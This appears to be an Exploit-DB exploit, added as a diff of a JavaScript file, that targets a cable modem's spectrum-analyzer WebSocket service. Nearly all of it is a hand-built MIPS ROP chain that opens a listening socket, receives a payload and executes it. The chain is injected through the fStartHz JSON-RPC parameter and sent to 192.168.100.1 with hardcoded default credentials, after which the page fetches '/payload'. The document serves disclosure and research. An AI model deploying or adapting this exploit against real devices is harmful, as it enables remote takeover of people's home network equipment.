@@ -1,0 +1,431 @@
+// EDB Note: Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47936.zip
+
+function buf2hex(buffer) { // buffer is an ArrayBuffer
+    return Array.prototype.map.call(new Uint8Array(buffer), x => ('00' + x.toString(16)).slice(-2)).join('');
+}
+
+function insertAt(arr, index, toInsert) {
+    for(let i = 0; i < toInsert.length; i++) {
+        arr[i+index]= toInsert[i];
+    }
+}
+
+function testEqual(buf1, buf2)
+{
+    if (buf1.byteLength != buf2.byteLength) return false;
+    var dv1 = new Int8Array(buf1);
+    var dv2 = new Int8Array(buf2);
+    for (var i = 0 ; i != buf1.byteLength ; i++)
+    {
+        if (dv1[i] != dv2[i]) return false;
+    }
+    return true;
+}
+
+arr = new Uint8Array(0xd00);
+
+arr.fill(0x41)
+
+firstSp = 0x00
+previousSp = firstSp
+sp = previousSp+0xa0
+insertAt(arr, previousSp+0x84-1, [0xc2, 0x80, 0x78, 0x7f, 0x64])
+insertAt(arr, previousSp+0x94-1, [0xf2, 0x80, 0x80, 0xa8, 0x64]) 
+// 0x8080a864: addiu $a0, $zero, 2; lw $ra, 0x14($sp); lw $s0, 0x10($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x20;
+
+previousSp = sp
+sp = previousSp+0x20
+insertAt(arr, previousSp+0x14-1, [0xc2, 0x80, 0x3a, 0x1b, 0x54]) 
+//0x803a1b54: addiu $a1, $zero, 1; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp-1, [0xc2, 0x80, 0x14, 0x27, 0x10]) 
+//0x80142710: move $a2, $zero; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp-1, [0xf2, 0x80, 0x8a, 0x89, 0x7c])
+insertAt(arr, previousSp+0x8-1, [0xf2, 0x80, 0x80, 0xa5, 0x40])
+//0x8080a540: move $v0, $s0; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10; 
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x4c, 0x27, 0x78])
+//0x804c2778: addiu $v0, $v0, 0x4d90; lw $ra, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x30;
+
+previousSp = sp
+sp = previousSp+0x30
+insertAt(arr, previousSp+0x24-1, [0xc2, 0x80, 0x1a, 0x5f, 0x4c])
+//0x801a5f4c: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+//call Socket
+
+//0x80a05b20
+socketAddr = [0xe2, 0x80, 0xa0, 0x5b, 0x20]
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, sp-1, socketAddr) //set s0 = socketAddr
+insertAt(arr, sp+0x14-1, [0xc2, 0x80, 0x78, 0x7f, 0x64]) //set s5
+insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, previousSp+0x20-1, [0xe2, 0x80, 0x8e, 0x2a, 0x20])
+//0x808e2a20: sw $v0, ($s0); move $v0, $s0; lw $ra, 0x14($sp); lw $s0, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;
+
+//0x80a05a30;
+serverAddr = [0xe2, 0x80, 0xa0, 0x5a, 0x30];
+
+previousSp = sp
+sp = previousSp+0x20
+insertAt(arr, sp-1, serverAddr) //set s0 = serverAddr
+insertAt(arr, previousSp+0x14-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp + 0x80
+insertAt(arr, previousSp+0x20-1, [0xc2, 0x80, 0x48, 0x71, 0x6c])
+//0x8048716c: move $a0, $s0; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp + 0x10
+insertAt(arr, previousSp+0x8-1, [0xf2, 0x80, 0x87, 0x9e, 0x68])
+//0x80879e68: move $a1, $zero; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp + 0x10
+insertAt(arr, previousSp-1, [0xe2, 0x80, 0x83, 0xd9, 0xb8])
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x7f, 0x18, 0x18])
+//0x807f1818: addiu $a2, $zero, 0x20; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp-1, [0xf2, 0x80, 0x80, 0xa5, 0x40])
+//0x8080a540: move $v0, $s0; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10; 
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x2e, 0x4f, 0x44])
+//0x802e4f44: addiu $v0, $v0, 0x77c8; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0x1a, 0x5f, 0x4c])
+//0x801a5f4c: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+//call memset
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, sp, [0x41, 0x2, 0x5, 0x39]) //set s0 = port
+insertAt(arr, sp+0x14-1, [0xc2, 0x80, 0x78, 0x7f, 0x64]) //set s5
+insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+// previousSp = sp
+// sp = previousSp+0x10
+// insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0x78, 0x7f, 0x64])
+// //0x80787f64: jalr $s5; nop;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, previousSp+0x20-1, [0xf2, 0x80, 0x80, 0xa5, 0x40])
+//0x8080a540: move $v0, $s0; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10; 
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, sp-1, serverAddr) //set s0 = serverAddr
+insertAt(arr, sp+0x14-1, [0xc2, 0x80, 0x78, 0x7f, 0x64]) //set s5
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, sp-1, socketAddr)
+insertAt(arr, previousSp+0x20-1, [0xe2, 0x80, 0x8e, 0x2a, 0x20])
+//0x808e2a20: sw $v0, ($s0); move $v0, $s0; lw $ra, 0x14($sp); lw $s0, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;
+//store port
+
+// previousSp = sp
+// sp = previousSp+0x20
+// insertAt(arr, previousSp+0x14-1, [0xc2, 0x80, 0x78, 0x7f, 0x64])
+// //0x80787f64: jalr $s5; nop;
+
+socketAddrM4 = [0xe2, 0x80, 0xa0, 0x5b, 0x1c]
+
+previousSp = sp
+sp = previousSp+0x20
+insertAt(arr, sp-1, socketAddrM4) //set s0 = socketAddr - 4
+insertAt(arr, previousSp+0x14-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, previousSp+0x20-1, [0xc2, 0x80, 0x3d, 0x5b, 0x30])
+//0x803d5b30: move $a0, $s0; move $v0, $zero; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0xd, 0x57, 0x6c])
+//0x800d576c: lw $a0, 4($a0); lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, sp+0x4-1, serverAddr) //set s1 = server
+insertAt(arr, previousSp-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, previousSp+0x20-1, [0xc2, 0x80, 0x5d, 0xdf, 0xb8])
+//0x805ddfb8: move $a1, $s1; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp + 0x10
+insertAt(arr, previousSp-1, [0xe2, 0x80, 0x8a, 0x62, 0x4c])
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x7f, 0x18, 0x18])
+//0x807f1818: addiu $a2, $zero, 0x20; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp-1, [0xf2, 0x80, 0x80, 0xa5, 0x40])
+//0x8080a540: move $v0, $s0; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10; 
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x2e, 0x4f, 0x44])
+//0x802e4f44: addiu $v0, $v0, 0x77c8; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0x1a, 0x5f, 0x4c])
+//0x801a5f4c: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+//call bind
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, sp-1, socketAddrM4) //set s0 = socketAddr - 4
+insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, previousSp+0x20-1, [0xc2, 0x80, 0x3d, 0x5b, 0x30])
+//0x803d5b30: move $a0, $s0; move $v0, $zero; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0xd, 0x57, 0x6c])
+//0x800d576c: lw $a0, 4($a0); lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp-1, [0xc2, 0x80, 0x3a, 0x1b, 0x54]) 
+//0x803a1b54: addiu $a1, $zero, 1; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, sp-1, [0xf2, 0x80, 0x8a, 0x91, 0x20]) //set s0 = listen - 0x
+insertAt(arr, previousSp-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, previousSp+0x20-1, [0xf2, 0x80, 0x80, 0xa5, 0x40])
+//0x8080a540: move $v0, $s0; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10; 
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x4c, 0x27, 0x78])
+//0x804c2778: addiu $v0, $v0, 0x4d90; lw $ra, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x30;
+
+previousSp = sp
+sp = previousSp+0x30
+insertAt(arr, previousSp+0x24-1, [0xc2, 0x80, 0x1a, 0x5f, 0x4c])
+//0x801a5f4c: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+//call listen
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, sp-1, socketAddrM4) //set s0 = socketAddr - 4
+insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, previousSp+0x20-1, [0xc2, 0x80, 0x3d, 0x5b, 0x30])
+//0x803d5b30: move $a0, $s0; move $v0, $zero; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0xd, 0x57, 0x6c])
+//0x800d576c: lw $a0, 4($a0); lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp-1, [0xc2, 0x80, 0x8, 0x40, 0x8])
+//0x80084008: move $a1, $zero; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, sp-1, [0xe2, 0x80, 0x8a, 0xd8, 0x84]) //set s0 = accept
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x14, 0x27, 0x10])
+//0x80142710: move $a2, $zero; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x8-1, [0xf2, 0x80, 0x80, 0xa5, 0x40])
+//0x8080a540: move $v0, $s0; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10; 
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x1a, 0x5f, 0x4c])
+//0x801a5f4c: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+//call accept
+
+//0x80a05b24
+clientAddr = [0xe2, 0x80, 0xa0, 0x5b, 0x24]
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, sp-1, clientAddr) //set s0 = clientAddr
+insertAt(arr, sp+0x14-1, [0xc2, 0x80, 0x78, 0x7f, 0x64]) //set s5
+insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, previousSp+0x20-1, [0xe2, 0x80, 0x8e, 0x2a, 0x20])
+//0x808e2a20: sw $v0, ($s0); move $v0, $s0; lw $ra, 0x14($sp); lw $s0, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;
+
+
+// previousSp = sp
+// sp = previousSp+0x20
+// insertAt(arr, previousSp+0x14-1, [0xc2, 0x80, 0x78, 0x7f, 0x64])
+// //0x80787f64: jalr $s5; nop;
+
+clientAddrM4 = [0xe2, 0x80, 0xa0, 0x5b, 0x20]
+
+previousSp = sp
+sp = previousSp+0x20
+insertAt(arr, sp-1, clientAddrM4) //set s0 = clientAddr - 4
+insertAt(arr, previousSp+0x14-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, previousSp+0x20-1, [0xc2, 0x80, 0x3d, 0x5b, 0x30])
+//0x803d5b30: move $a0, $s0; move $v0, $zero; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0xd, 0x57, 0x6c])
+//0x800d576c: lw $a0, 4($a0); lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp-1, [0xc2, 0x80, 0x4c, 0x10, 0x38])
+//0x804c1038: addiu $a2, $zero, 0x400; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+//0x80a05c30
+payloadAddr = [0xe2, 0x80, 0xa0, 0x5c, 0x30]
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, sp+0x4-1, payloadAddr) //set s1 = payload
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, previousSp+0x20-1, [0xc2, 0x80, 0x5d, 0xdf, 0xb8])
+//0x805ddfb8: move $a1, $s1; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x46, 0x73, 0x68])
+//0x80467368: move $a3, $zero; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, sp-1, [0xf2, 0x80, 0x8a, 0x93, 0x3c]) //set s0 = recv - 0x
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, previousSp+0x20-1, [0xf2, 0x80, 0x80, 0xa5, 0x40])
+//0x8080a540: move $v0, $s0; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10; 
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x4c, 0x27, 0x78])
+//0x804c2778: addiu $v0, $v0, 0x4d90; lw $ra, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x30;
+
+previousSp = sp
+sp = previousSp+0x30
+insertAt(arr, previousSp+0x24-1, [0xc2, 0x80, 0x1a, 0x5f, 0x4c])
+//0x801a5f4c: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+//call recv
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x4-1, [0xf2, 0x80, 0x80, 0xa8, 0x64]) 
+// 0x8080a864: addiu $a0, $zero, 2; lw $ra, 0x14($sp); lw $s0, 0x10($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x20;
+
+previousSp = sp
+sp = previousSp+0x20
+insertAt(arr, previousSp+0x14-1, [0xc2, 0x80, 0x12, 0x3b, 0x7c])
+//0x80123b7c: addiu $a0, $a0, 4; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, sp-1, [0xf2, 0x80, 0x8a, 0xab, 0x5c]) //set s0 = sleep
+insertAt(arr, previousSp-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, previousSp+0x20-1, [0xf2, 0x80, 0x80, 0xa5, 0x40])
+//0x8080a540: move $v0, $s0; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10; 
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x1a, 0x5f, 0x4c])
+//0x801a5f4c: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+//call sleep
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, sp-1, payloadAddr) //set s0 = payload
+insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0xd0, 0xb9, 0xc])
+//0x80d0b90c: lw $ra, 0x20($ra); lw $s0, 4($sp) ... lw $s7, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x80;
+
+previousSp = sp
+sp = previousSp+0x80
+insertAt(arr, previousSp+0x20-1, [0xf2, 0x80, 0x80, 0xa5, 0x40])
+//0x8080a540: move $v0, $s0; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10; 
+
+previousSp = sp
+sp = previousSp+0x10
+insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x1a, 0x5f, 0x4c])
+//0x801a5f4c: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+
+var string = new TextDecoder("utf-8").decode(arr);
+
+var newArr = new TextEncoder("utf-8").encode(string);
+
+console.log(buf2hex(newArr));
+
+exploit = '{"jsonrpc":"2.0","method":"Frontend::GetFrontendSpectrumData","params":{"coreID":0,"fStartHz":' + string + ',"fStopHz":1000000000,"fftSize":1024,"gain":1},"id":"0"}'
+console.log(exploit)
+
+console.log(testEqual(arr, newArr));
+
+var socket = new WebSocket("ws://spectrum:spectrum@192.168.100.1:6080/Frontend", 'rpc-frontend')
+
+socket.onopen = function(e) {
+    socket.send(exploit)
+    fetch('/payload')
+};
